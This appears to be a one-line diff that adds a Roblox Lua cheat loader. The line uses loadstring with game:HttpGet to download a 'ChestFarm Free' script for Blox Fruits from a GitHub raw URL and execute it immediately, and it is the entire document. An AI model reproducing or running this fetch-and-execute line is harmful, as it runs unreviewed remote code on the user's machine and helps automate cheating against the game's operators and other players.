@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SxedraReal/BloxFruit/main/ChestFarm%20Free"))()
